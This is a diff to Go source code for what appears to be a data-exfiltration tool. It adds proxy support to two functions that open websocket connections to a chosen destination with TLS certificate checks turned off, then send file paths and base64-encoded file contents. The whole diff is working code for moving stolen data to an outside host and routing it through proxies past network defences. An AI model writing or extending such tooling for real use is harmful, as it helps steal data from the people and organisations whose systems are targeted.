@@ -13,6 +13,8 @@ import (
 	"encoding/hex"
 	"io"
 	"net"
+	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -457,20 +459,28 @@ func wait(t time.Time, waitEvery, waitFor time.Duration) time.Time {
 
 // WebsocketExfil will return a function pointer to an ExfilFunc that
 // exfils via a websocket connection.
-func WebsocketExfil(dst string) (ExfilFunc, error) {
+func WebsocketExfil(dst string, proxy ...string) (ExfilFunc, error) {
 	var c *ws.Conn
-	var dialer ws.Dialer
+	var dialer *ws.Dialer
 	var e error
 	var f ExfilFunc
 	var m *sync.Mutex = &sync.Mutex{}
+	var tmp *url.URL
+
+	// Skip verify in case user is using self-signed cert
+	dialer = ws.DefaultDialer
+	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
+	// Use proxy if provided
+	if len(proxy) > 0 {
+		if tmp, e = url.Parse(proxy[0]); e != nil {
+			return nil, errors.Newf("failed to parse proxy: %w", e)
+		}
+
+		dialer.Proxy = http.ProxyURL(tmp)
+	}
 
 	// Connect to Websocket
-	dialer = ws.Dialer{
-		// Skip verify in case user is using self-signed cert
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-		},
-	}
 	if c, _, e = dialer.Dial(dst, nil); e != nil {
 		return nil, errors.Newf("failed Websocket connection: %w", e)
 	}
@@ -492,19 +502,35 @@ func WebsocketExfil(dst string) (ExfilFunc, error) {
 
 // WebsocketParallelExfil will return a function pointer to an
 // ExfilFunc that exfils via multiple websocket connections.
-func WebsocketParallelExfil(dst string) (ExfilFunc, error) {
-	var dialer = ws.Dialer{
-		// Skip verify in case user is using self-signed cert
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-		},
+func WebsocketParallelExfil(
+	dst string,
+	proxy ...string,
+) (ExfilFunc, error) {
+	var dialer *ws.Dialer
+	var e error
+	var f ExfilFunc
+	var tmp *url.URL
+
+	// Skip verify in case user is using self-signed cert
+	dialer = ws.DefaultDialer
+	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
+	// Use proxy if provided
+	if len(proxy) > 0 {
+		if tmp, e = url.Parse(proxy[0]); e != nil {
+			return nil, errors.Newf("failed to parse proxy: %w", e)
+		}
+
+		dialer.Proxy = http.ProxyURL(tmp)
 	}
-	var f ExfilFunc = func(path string, b []byte) error {
+
+	f = func(path string, b []byte) error {
 		var b64 []byte = []byte(base64.StdEncoding.EncodeToString(b))
 		var c *ws.Conn
 		var data []byte = append([]byte(path+" "), b64...)
 		var e error
 
+		// Connect to Websocket
 		if c, _, e = dialer.Dial(dst, nil); e != nil {
 			return errors.Newf("failed Websocket connection: %w", e)
 		}
